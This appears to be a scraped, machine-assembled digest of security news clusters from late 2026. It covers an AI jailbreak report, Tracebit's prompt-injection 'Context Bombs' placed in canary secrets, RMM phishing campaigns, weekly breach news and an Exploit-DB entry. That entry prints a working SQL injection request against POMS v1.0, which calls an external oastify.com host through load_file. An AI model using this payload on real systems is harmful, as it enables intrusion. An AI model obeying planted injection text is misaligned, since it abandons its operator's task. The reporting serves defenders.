report from Mindgard found that its AI models, Kimi K2.6 and K3 Swarm, could bypass safety guardrails and generate dangerous information, including providing plans for cyberattacks, terrorism plots, and assassinations. Prompt injection as defense Context Bombs Against Abliterated AI Models In July 2026, Tracebit detailed a technique called Context Bombs that uses prompt injections as a way to trip an AI model provider's runtime safety checks and prevent it from taking malicious actions. In a new report, the AI security company said indirect prompt injections can be used to stop attacks from open-weight models, abliterated or otherwise. "We turned to indirect prompt injection: instructions placed in material an agent reads while carrying out its task," Tracebit said . "The new payload was designed to make the agent believe its operator had ended the assessment. We placed it inside a canary secret in AWS Secrets Manager, where an agent exploring the account could discover it. The string used conversation delimiters to m
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ThreatsDay: AI-Powered Zero-Day Chain, 543K Live Secrets, Model Inspection RCE and 13 More Stories
  - Published: 2026-10-01T16:45:38+00:00
  - Link: https://thehackernews.com/2026/10/threatsday-ai-powered-zero-day-chain.html
  - Summary: This week, the useful words are boring ones: inspect, cache, compile, store, trust. Each sounds harmless. Each can become an attack path when a system does a little more than people expect. A model check can run code. A cache can mix up requests. A public secret can stay useful for years. That is the lesson running through the list. Attackers do not always need a brilliant new trick. They can

### Cluster 48be01e909 — score 10

- Title: Phishing Abuses RMM Tools for Persistent Access
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-29T21:39:27+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: GitLab, Microsoft Defender, ScreenConnect
- tools_used: ScreenConnect
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: ScreenConnect, Microsoft Defender, GitLab
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft observed phishing campaigns that abused MSP360 RMM to deploy ScreenConnect, creating redundant remote-access channels for follow-on activity The post Phishing Abuses RMM Tools for Persistent Access appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Phishing Social engineering Content types Research Products and services Microsoft Defender Microsoft Defender Experts Topics Actionable threat insights Threat intelligence In July 2026, Microsoft Defender Experts observed phishing campaigns targeting organizations across multiple industries that distributed a masqueraded MSP360 Remote Monitoring and Management (RMM) installer through meeting invitations, PDF-themed lures, software update prompts, and other social-engineering content. Once executed, the legitimate MSP360 installer, distributed under a deceptive file name established remote management access on affected devices and enabled threat actors to gain an initial foothold using trusted administrative software. Microsoft observed the MSP360 deployment being used to download and install a ConnectWise ScreenConnect client, creating a secondary remote-access channel that provided redundant access to compromised systems. Microsoft did not observe exploitation of ScreenConnect software itself; rather, threat actors abused legitimately obtained remote administration software to establish and maintain access. After access was established, threat actors used these remote administration channels to deploy additional tools and conduct post-compromise activity, including information collection and credential-access operations. This activity highlights how threat actors continue to abuse legitimate remote administration software to blend into normal IT operations while maintaining persistent access and reducing detection opportunities. Microsoft Defender for Endpoint detects suspicious and uncommon remote-management activity, while the hunting queries and mitigations in this post can help organizations identify and restrict unapproved RMM use. Attack chain overview The observed multi-stage intrusion chain began when phishing lures delivered a legitimate, digitally signed MSP360 RMM v2.5.0.67 installer under deceptive filenames. Following successful User Account Control (UAC) elevation, the installer established MSP360 services for persistent access and leveraged the RMM agent to invoke PowerShell, download, and silently install ConnectWise ScreenConnect. This effectively introduced a second remote administration channel on the compromised device, which the threat actor subsequently used to transfer and execute additional tooling supporting credential access, local data collection, and other post-compromise activity. Figure 1. Attack chain showing phishing delivering a masqueraded MSP360 RMM installer that deploys ScreenConnect for persistent remote access and follow-on activity. Initial Access: Phishing Campaign Delivering Masqueraded MSP360 RMM Installer Microsoft observed multiple phishing campaigns that used a multi-stage delivery chain to distribute legitimate, digitally signed MSP360 RMM software (v2.5.0.67). Phishing emails directed users to actor-controlled landing pages that impersonated document-sharing portals, invitation workflows, Adobe Reader download pages, Zoom installation pages, and business collaboration platforms. Upon user interaction, victims were redirected to download locations hosted on both attacker-controlled infrastructure and legitimate cloud services including Amazon S3, Cloudflare R2, Dropbox, GitLab, and Supabase. The downloaded executables used filenames crafted to resemble legitimate business content, meeting invitations, PDF documents, and software installers. Analysis of downloaded samples showed that many ultimately contained the same MSP360 RMM installer package despite appearing as different files to the victim. MSP360 SHA256: 108ef7e628d7a20bd6241a5b57149e27a6061f467123eb64061975559f8f73dc MSP360 SHA1: f34330d4c6e0aa978dc3af40360c14b31ad51127 Observed lure themes: We have observed the threat actor using multiple social-engineering themes, including: Workplace meeting requests Zoom and Google Meet installation prompts Adobe Acrobat and PDF reader updates RSV
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Phishing Abuses RMM Tools for Persistent Access
  - Published: 2026-09-29T21:39:27+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/
  - Summary: Microsoft observed phishing campaigns that abused MSP360 RMM to deploy ScreenConnect, creating redundant remote-access channels for follow-on activity The post Phishing Abuses RMM Tools for Persistent Access appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Phishing Abuses RMM Tools for Persistent Access
  - Published: 2026-09-29T21:39:27+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/
  - Summary: Microsoft observed phishing campaigns that abused MSP360 RMM to deploy ScreenConnect, creating redundant remote-access channels for follow-on activity The post Phishing Abuses RMM Tools for Persistent Access appeared first on Microsoft Security Blog .

### Cluster f28e2b9829 — score 10

- Title: 5th October – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-10-05T13:57:30+00:00
- Link: https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
- affected_industries: aviation_defense, education, financial_services, government
- affected_products: Azure, Citrix, OpenAI/ChatGPT
- cve_ids: CVE-2026-76504, CVE-2026-86950, CVE-2026-88771, CVE-2026-88772
- urgency_signals: critical_cvss, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
- affected_industries: financial_services, government, aviation_defense, education
- affected_products: Azure, Citrix, OpenAI/ChatGPT
- cve_ids: CVE-2026-88771, CVE-2026-88772, CVE-2026-76504, CVE-2026-86950
- urgency_signals: preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 5th October, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Arizona’s state court system has suffered a phishing-led cyberattack after an employee clicked a malicious link. Attackers copied backup files containing protective-order records and more than 150,000 Foster Care Review Board reports […] The post 5th October – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 5th October – Threat Intelligence Report October 5, 2026 https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 5th October, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Arizona’s state court system has suffered a phishing-led cyberattack after an employee clicked a malicious link. Attackers copied backup files containing protective-order records and more than 150,000 Foster Care Review Board reports dating back to 2010, exposing personal and case-related information belonging to current and former participants. Japanese car-sharing service Times Car has disclosed a data breach affecting approximately 6.6 million current and former accounts. Exposed information includes personal data, while identity-verification documents, including driver’s-license images, were exposed for about 1.6 million accounts. Payment card information was not affected. South Africa’s air navigation provider has suffered a ransomware attack affecting operational technology supporting aviation weather services. Preliminary findings identified suspicious activity in weather-related environments, while separate reporting cited possible data theft. The provider has sought independent digital forensics to determine the scope of the incident. Fakturownia, a Polish online invoicing platform used by more than 600,000 businesses, has disclosed a data breach after an attacker exploited a system vulnerability. Copied information included account and company data, password hashes, bank account details, authentication tokens, contractor information, and portions of invoices stored on the platform. AI THREATS Researchers observed autonomous AI agents attempting rudimentary hacking techniques while gathering public information from US and Canadian government websites. Activity included failed SQL injection attempts against the US Department of Education and Library and Archives Canada. Officials reported no compromise, while the origin of the agents remains unconfirmed. Researchers demonstrated that malicious Custom GPTs hosted on ChatGPT were used in a ClickFix campaign to deliver remote access malware. Victims were redirected to a Google Sites page and tricked into running commands. Huntress investigated at least 40 related incidents, including two confirmed infections that began through Custom GPTs. Researchers outlined how JadePuffer, an AI-enabled threat actor tracked as Storm-3168, used compromised Azure service principals to automate cloud reconnaissance and destructive actions. The activity included deleting storage and application resources, targeting backup-related assets, and attempting to retrieve access keys, reflecting agent-driven post-compromise operations in cloud environments. VULNERABILITIES AND PATCHES Citrix has issued fixes for critical NetScaler vulnerabilities CVE-2026-88771-2, affecting NetScaler ADC and Gateway. Attackers have exploited the flaws to gain remote access, deploy web shells and tunneling malware, steal credentials, and move from exposed appliances into internal networks. Check Point IPS provides protection against these threats (Citrix NetScaler Multiple Products Buffer Overflow (CVE-2026-88772), Citrix NetScaler Multiple Products Command Injection (CVE-2026-88771)) Cisco has alerted about CVE-2026-76504, a critical (CVSS 9.8) vulnerability in Catalyst SD-WAN Manager. The flaw allows an unauthenticated remote attacker to send crafted requests and gain administrator access. Cisco reported active exploitation and stated that no fixes are available. Check Point IPS provides protection against this threat (Cisco Catalyst SD-WAN Manager Authentication Bypass (CVE-2026-76504)) Apple has patched CVE-2026-86950, a CoreGraphics memory corruption vulnerability affecting iPhones, iPads, and Macs. Processing a malicious image or PDF can allow arbitrary code exec
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 5th October – Threat Intelligence Report
  - Published: 2026-10-05T13:57:30+00:00
  - Link: https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 5th October, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Arizona’s state court system has suffered a phishing-led cyberattack after an employee clicked a malicious link. Attackers copied backup files containing protective-order records and more than 150,000 Foster Care Review Board reports […] The post 5th October – Threat Intelligence Report appeared first on Check Point Research .

### Cluster fb1a8533f5 — score 10

- Title: The Fine Art of Frustrating the Adversary
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-01T10:00:05+00:00
- Link: https://blog.talosintelligence.com/the-fine-art-of-frustrating-the-adversary/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
What really frustrates an adversary? Eight Cisco Talos researchers share practical ways to make their next move slower and riskier. From deception and behavioral detection to breaking attack dependencies and resisting manufactured urgency.
```

#### Full body

```
The Fine Art of Frustrating the Adversary By Hazel Burton Thursday, October 1, 2026 06:00 On The Radar For Cybersecurity Awareness Month, eight Cisco Talos researchers share practical ways defenders can frustrate adversaries at different stages of an operation. Deception techniques such as honeypot accounts, false infrastructure, and tarpits can slow adversaries down while giving defenders earlier opportunities to detect their activity. Behavioral detections, tighter control of legitimate remote-management tools, and clear boundaries around AI agents can make essential adversary actions more visible and easier to interrupt. Breaking dependencies between stages of an operation can prevent an adversary from reaching their next objective. Years ago, Cisco Talos blocked an adversary’s command-and-control (C2) traffic. The adversary responded by tweeting, “Write a rule for your a**.” A fine endorsement of our work, if I’ve ever heard one. Talos loves to see an adversary forced to change course. And if every alternative for them is slower, less stealthy, less reliable and more expensive? Chef’s kiss. Adversaries rely on certain advantages. They look for environments where tools and infrastructure allow them to blend in with normal activity. They also look for employees who can be pressured into acting before they have time to think. Strong cybersecurity defenses can change those conditions. They take away adversary choices and increase the risk attached to essential actions, forcing them to keep making new decisions. Each change of plan costs them time and resources, and may eventually cause them to give up and move to another target. It also creates more opportunities for defenders to spot what they are doing. For Cybersecurity Awareness Month, we’re exploring “the fine art of frustrating the adversary.” To kick us off, I asked researchers across Talos, covering all aspects of the attack chain, for the strongest recommendation they could give defenders to seriously frustrate a potential adversary in their environment, and what that action would prevent the adversary from doing next. Take away their choices Many adversaries use techniques that succeed against a large number of organizations. This makes a lot of economic sense: An operation that depends on every potential target having an unusual configuration will not scale particularly well. But it also creates an opportunity for defenders. “By being unique and setting things up a little differently, you may be able to better defend your environment when they come knocking,” Pierre says. For example, organizations can restrict which accounts are permitted to sign into their most critical servers, alert on connection attempts from unauthorized users, and closely monitor any changes to those restrictions. Different credentials or authentication methods can be required for particularly sensitive systems, while protected enclaves can provide increased monitoring around critical infrastructure. Pierre also recommends that defenders “monitor (and alert) for any changes to administrative users or administrative groups.” Of course, no amount of security measures makes an organization impenetrable, but they can make the common methods adversaries use much less dependable. Deception can push that uncertainty even further. “Affecting the attack earlier rather than later in the attack chain is best,” Martin says. “Better to stop an attack from happening than minimize the consequences after it has happened.” Martin suggests creating honeypot email accounts using expired domains with addresses that have previously leaked, or developing fictional employee profiles and seeding their addresses in places where spammers and other adversaries are likely to discover them. Because these accounts have no legitimate users, messages sent to them can be treated with far greater suspicion. The activity can provide early tactical intelligence about malicious infrastructure, lures, and campaigns, allowing defe
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: The Fine Art of Frustrating the Adversary
  - Published: 2026-10-01T10:00:05+00:00
  - Link: https://blog.talosintelligence.com/the-fine-art-of-frustrating-the-adversary/
  - Summary: What really frustrates an adversary? Eight Cisco Talos researchers share practical ways to make their next move slower and riskier. From deception and behavioral detection to breaking attack dependencies and resisting manufactured urgency.

### Cluster b598221d36 — score 10

- Title: Horizon3 + CrowdStrike: Prove. Prioritize. Verify.
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-02T19:00:45+00:00
- Link: https://horizon3.ai/downloads/factsheets/horizon3-crowdstrike-integration/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how Horizon3 and CrowdStrike connect NodeZero exploitability intelligence with Falcon Next-Gen SIEM and Fusion SOAR to prove, prioritize, remediate, and verify exploitable risk.
```

#### Full body

```
Horizon3 + CrowdStrike: Prove. Prioritize. Verify. Horizon3 October 2, 2026 Factsheets Security teams have more vulnerability data than ever, but knowing a weakness exists isn’t the same as knowing whether an attacker can actually exploit it. Horizon3 and CrowdStrike bring NodeZero® exploitability intelligence from autonomous pentesting into CrowdStrike Falcon® Next-Gen SIEM and Fusion SOAR workflows, creating a continuous loop for proving, prioritizing, remediating, and verifying exposure. The result: security and IT teams can focus on the risks that matter most and move from proof to action without losing time between tools. 2609_SolutionsBrief_Crowdstrike… Connect Exploitability Proof to the Workflows Your Teams Already Use NodeZero proves what is exploitable. CrowdStrike Falcon brings that proof into the workflows teams already use. Configured response workflows can act on those findings, and NodeZero can verify whether remediation actually closed the attack path. 2609_SolutionsBrief_Crowdstrike… Together, Horizon3 and CrowdStrike help teams: Fix what an attacker can use by prioritizing findings based on environment-specific context, exploitability, and blast radius Keep teams in their existing workflows by surfacing NodeZero findings and remediation context in Falcon Next-Gen SIEM Verify the fix with NodeZero 1-Click Verify retesting Track exploitable exposure in a unified location through the Exploitable & Exposed dashboard Continuously validate real-world attack paths across CrowdStrike-managed production assets Accelerate remediation with Fusion SOAR playbooks scoped to the hosts and techniques uncovered by NodeZero 2609_SolutionsBrief_Crowdstrike… Extend Project QuiltWorks from Discovery to Proven Protection Project QuiltWorks accelerates vulnerability discovery through frontier AI research and coalition discovery efforts. NodeZero extends that workflow by autonomously testing relevant assets across infrastructure, identity, cloud, web applications, and endpoints to determine what can actually be exploited. Proven exploitability then flows into CrowdStrike workflows so teams can prioritize based on real attack paths and business impact, remediate using their existing tools, and use NodeZero 1-Click Verify to confirm that the path is closed. Discover. Prove. Prioritize. Fix and verify. 2609_SolutionsBrief_Crowdstrike… See Horizon3 and CrowdStrike in Action Download the Horizon3 + CrowdStrike Joint Solution Brief to see how NodeZero and CrowdStrike Falcon connect autonomous pentesting, exploitability intelligence, remediation, and verification to help teams continuously prove their security from the attacker’s perspective. Download the PDF How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Horizon3 + CrowdStrike: Prove. Prioritize. Verify.
  - Published: 2026-10-02T19:00:45+00:00
  - Link: https://horizon3.ai/downloads/factsheets/horizon3-crowdstrike-integration/
  - Summary: See how Horizon3 and CrowdStrike connect NodeZero exploitability intelligence with Falcon Next-Gen SIEM and Fusion SOAR to prove, prioritize, remediate, and verify exploitable risk.

### Cluster 10655cf618 — score 10

- Title: What Security Metrics Actually Matter?
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-01T16:17:43+00:00
- Link: https://horizon3.ai/intelligence/blogs/ctem-security-metrics-that-matter/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Security activity doesn’t always equal risk reduction. Learn how attack paths, business impact, verification, remediation speed, and recurrence can show whether CTEM is actually working.
```

#### Full body

```
What Security Metrics Actually Matter? Stephen Gates October 1, 2026 Blogs Measure the Change, Not Just the Work Cybersecurity has no shortage of metrics. Organizations track vulnerabilities discovered, tickets created, patches applied, remediation SLAs, and countless other measures of security activity. These metrics help teams manage workloads and identify bottlenecks. What they do not necessarily reveal is whether the work reduced the organization’s exposure. A vulnerability can move through the entire remediation process within the required SLA while the same attack path and impact remain possible. Every operational metric may indicate success without proving that the environment became harder to attack. That is why effective Continuous Threat Exposure Management (CTEM) measurement must begin with a different question: Are we becoming harder to attack? This connects directly to the real intention of CTEM: continuous exposure management. Measuring that outcome requires looking beyond how many vulnerabilities exist or even how many can be exploited. Vulnerable does not always equal exploitable, and exploitable does not always equal impact. An exploitable weakness may provide initial access but leave an attacker unable to move laterally, escalate privileges, bypass controls, or reach anything valuable. The real measure is the impact an attacker can achieve after gaining that access and whether those impacts are being reduced over time. Measure Attack Paths and Impacts Validation must continue beyond successful exploitation to determine how far an attacker can progress and what impact becomes possible. Can they compromise identities, escalate privileges, move laterally, reach critical systems, or access sensitive data? Do existing controls stop the attack, or can the attacker continue toward an objective that matters to the business? Attack paths provide the evidence connecting an exploitable weakness to those impacts. They show how vulnerabilities, credentials, permissions, misconfigurations, trust relationships, and failed controls combine to let an attacker progress through the environment. Organizations should therefore measure whether proven attack paths are decreasing across testing cycles and, more importantly, whether the impacts those paths produce are being reduced. One path to a business-critical system may matter more than dozens of exploitable vulnerabilities that lead nowhere consequential. The goal is not to replace vulnerability counting with exploitability counting. It is to reduce the attack paths and impacts that create meaningful business risk. Measure How Quickly Impact Is Reduced Once an attack path and the impact it can produce have been validated, time matters. Until that exposure is fully addressed, it continues to give attackers an opportunity to act. Organizations should measure the time between validation and mitigation. Mitigation constrains the immediate opportunity through actions such as restricting access, disabling a vulnerable service, or implementing a compensating control while a permanent fix is developed. They should also measure the time required to remediate the underlying conditions. Depending on the attack path, that may require addressing several weaknesses across vulnerabilities, credentials, permissions, configurations, or security controls. This distinction matters because eliminating the initial weakness may not eliminate the broader path or prevent the original impact. Organizations should measure the time from validation through mitigation, remediation, and verification. This shows how quickly they can eliminate a proven attack path and confirm that its associated impact is no longer achievable, while also revealing where ownership, competing priorities, change-management constraints, or technical dependencies are slowing progress. Measure Verification and Recurrence Verification should determine more than whether a vulnerability was patched or an isolated weakness can no longe
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: What Security Metrics Actually Matter?
  - Published: 2026-10-01T16:17:43+00:00
  - Link: https://horizon3.ai/intelligence/blogs/ctem-security-metrics-that-matter/
  - Summary: Security activity doesn’t always equal risk reduction. Learn how attack paths, business impact, verification, remediation speed, and recurrence can show whether CTEM is actually working.

### Cluster d98d1967f2 — score 10

- Title: [webapps] POMS oretnom23v1.0 - SQLi vulnerabilities
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-10-01T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52684
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
POMS oretnom23v1.0 - SQLi vulnerabilities
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training POMS oretnom23v1.0 - SQLi vulnerabilities EDB-ID: 52684 CVE: N/A EDB Verified: Author: nu11secur1ty Type: webapps Exploit: / Platform: Multiple Date: 2026-10-01 Vulnerable App: # Title: POMS oretnom23v1.0 - SQLi vulnerabilities # Author: nu11secur1ty # Date: 10/01/2026 # Vendor: https://github.com/oretnom23 # Software: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html # Reference: https://portswigger.net/web-security/sql-injection ## Description: The password parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\ y10in4ofvosyskgb5c9a7e55mwssgkf86bu3hu5j.oastify.com\\ifs'))+' was submitted in the password parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. STATUS: CRITICAL [+]Payload: ``` POST /purchase_order/classes/Login.php?f=login HTTP/1.1 Host: localhost Cache-Control: max-age=0 Sec-CH-UA: "Chromium";v="151", "Not;A=Brand";v="24", "Google Chrome";v="151" Sec-CH-UA-Mobile: ?0 Sec-CH-UA-Platform: "Windows" Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Accept: */* Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Connection: close Cookie: PHPSESSID=io6v7ltscimb0vv716cvdphifd Origin: http://localhost X-Requested-With: XMLHttpRequest Referer: http://localhost/purchase_order/admin/login.php Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 37 username=YIMivRgy&password=l9V!q9b!X1'%2b(select%20load_file('%5c%5c%5c% 5cy10in4ofvosyskgb5c9a7e55mwssgkf86bu3hu5j.oastify.com%5c%5cifs'))%2b' ``` # Demo: [href]( https://odysee.com/@nu11secur1ty:b/Kousei-the-agressive-frameweork-for-sqlmap:1 ) # Time spent: 01:15:00 -- System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html https://cxsecurity.com/ and https://www.exploit-db.com/ home page: https://www.asc3t1c-nu11secur1ty.com/ hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/> -- System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at https://packetstorm.news/ https://cve.mitre.org/index.html https://cxsecurity.com/ and https://www.exploit-db.com/ 0day Exploit DataBase https://0day.today/ home page: https://www.asc3t1c-nu11secur1ty.com/ hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty <http://nu11secur1ty.com/> Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [webapps] POMS oretnom23v1.0 - SQLi vulnerabilities
  - Published: 2026-10-01T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52684
  - Summary: POMS oretnom23v1.0 - SQLi vulnerabilities

### Cluster 93df4bafde — score 10

- Title: SequenceHash: multihashing for the rest of us
- Source: Trail of Bits (offensive_vulnerability_research)
- Published: 2026-10-02T11:00:00+00:00
- Link: https://blog.trailofbits.com/2026/10/02/sequencehash-multihashing-for-the-rest-of-us/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Multihashing is one of those cryptographic tasks that’s easy not to think about too much. This is unfortunate, because multihashing is a common stumbling point when cryptographers try to use hashes. As part of our goal to “fix software, not bugs,” Trail of Bits is introducing SequenceHash and its sister function SequenceMAC , a pair of related hash constructions that bring secure multihashing to developers using hash functions other than Keccak. We hope SequenceHash and SequenceMAC will help cryptographers avoid attacks that take advantage of ambiguous input encodings. The specification is open source, and is now a part of the Community Cryptography Specification Project (C2SP). SequenceHash and SequenceMAC behave similarly to NIST’s TupleHash , but have the advantage of not being tied to a single hash function. They also don’t require developers to implement fiddly computations that aren’t byte-aligned. Instead, SequenceHash and SequenceMAC work out of the box with nearly any secure c
```

#### Full body

```
Page content Multihashing is one of those cryptographic tasks that’s easy not to think about too much. This is unfortunate, because multihashing is a common stumbling point when cryptographers try to use hashes. As part of our goal to “fix software, not bugs,” Trail of Bits is introducing SequenceHash and its sister function SequenceMAC , a pair of related hash constructions that bring secure multihashing to developers using hash functions other than Keccak. We hope SequenceHash and SequenceMAC will help cryptographers avoid attacks that take advantage of ambiguous input encodings. The specification is open source, and is now a part of the Community Cryptography Specification Project (C2SP). SequenceHash and SequenceMAC behave similarly to NIST’s TupleHash , but have the advantage of not being tied to a single hash function. They also don’t require developers to implement fiddly computations that aren’t byte-aligned. Instead, SequenceHash and SequenceMAC work out of the box with nearly any secure cryptographic hash function you care to use, including SHA256/384/512, BLAKE, and RIPEMD. SequenceMAC supports keys 32 bytes or longer (up to the ridiculous limit of ${2}^{128}-1$ bytes). (It’s worth noting: SequenceHash and SequenceMAC rely on the security of the underlying hash for their own security. SequenceHash and SequenceMAC can’t magically make MD4 or SHA0 secure again. For the purposes of this document, it’s assumed that you have chosen a reasonable hash function like SHA256, not CRC32.) To make SequenceHash and SequenceMAC easy to use, we’re releasing three initial implementations of SequenceHash and SequenceMAC: one each in Rust, Go, and Python. We’re also releasing a large set of test vectors that cover multiple hash functions and include intermediate values to help developers debug and verify their implementations. Wait, “multihashing”? Yeah, it’s a weird term, but the idea is pretty simple. “Multihashing” means “hashing a bunch of values together.” If you’ve ever read a cryptography paper, and there’s a step that says something like “compute the shared authenticator N=Hash(X, Y, Z, A, B) ,” that’s multihashing. You need to create a hash that incorporates the inputs X, Y, Z, A , and B . Unfortunately, the simple “solution” of concatenating the inputs and hashing the result can lead to serious security problems. For example, consider what happens when you hash three inputs using “raw” SHA256: import hashlib hasher = hashlib . new ( 'sha256' ) hasher . update ( b 'Test 0' ) hasher . update ( b 'Test 1' ) hasher . update ( b 'Test 2' ) print ( hasher . hexdigest ()) hasher = hashlib . new ( 'sha256' ) hasher . update ( b 'Test 0Test 1' ) hasher . update ( b 'Test 2' ) print ( hasher . hexdigest ()) hasher = hashlib . new ( 'sha256' ) hasher . update ( b 'Test 0' ) hasher . update ( b '' ) hasher . update ( b 'Test 1Test 2' ) print ( hasher . hexdigest ()) This produces the following output: 4fce0a9940a42b5c9d1bcbfc9a6ddd6de20d731d584a0acf5bda6de86483641c 4fce0a9940a42b5c9d1bcbfc9a6ddd6de20d731d584a0acf5bda6de86483641c 4fce0a9940a42b5c9d1bcbfc9a6ddd6de20d731d584a0acf5bda6de86483641c Even though inputs are fed in through separate calls, they’re not separated from the perspective of the hash function—under the hood, the inputs are just concatenated. As with many things in cryptography, multihashing is harder than you think. That’s a big problem because multihashing is a critical component of one of the most important tools in zero-knowledge proofs: the Fiat-Shamir transform . When you get multihashing wrong, you introduce the risk of forgeries into your zero-knowledge proofs. Given that zero-knowledge proofs play a major role in cryptocurrency nowadays, that sort of mistake is sometimes measured in millions of dollars. But Fiat-Shamir transforms aren’t the only place where you might want to use multihashing. It’s not uncommon to need to hash a collection of related objects, where both the objects and the collection are variable
```

#### Corroborating sources (1)

- **Trail of Bits** (offensive_vulnerability_research)
  - Title: SequenceHash: multihashing for the rest of us
  - Published: 2026-10-02T11:00:00+00:00
  - Link: https://blog.trailofbits.com/2026/10/02/sequencehash-multihashing-for-the-rest-of-us/
